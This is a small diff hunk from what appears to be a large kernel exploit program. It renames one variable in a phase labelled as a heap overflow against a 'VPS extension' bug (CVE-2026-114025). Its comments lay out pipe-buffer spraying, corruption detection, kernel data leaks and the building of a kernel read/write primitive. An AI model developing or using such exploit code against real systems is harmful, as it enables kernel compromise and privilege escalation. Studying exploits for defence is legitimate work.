@@ -21075,10 +21075,10 @@ new_modes:
          * 15e: Read pipes, detect corruption, extract kernel data
          * 15f: If corruption found, build kernel R/W primitive
          * ================================================================ */
-        if (rounds == 229 && r229_match_idx >= 0) {
+        if (rounds == 229 && r229_matched_idx >= 0) {
             rlog("\n=== Phase 15 (r=229): VPS Heap Overflow ====\n");
             rlog("Target: CVE-2026-114025 VPS extension bounds overflow\n");
-            rlog("Match surface: spray[%d]\n", r229_match_idx);
+            rlog("Match surface: spray[%d]\n", r229_matched_idx);
 
             /* 15a: Spray pipe buffers with sentinel data */
             #define P15_PIPE_COUNT 512
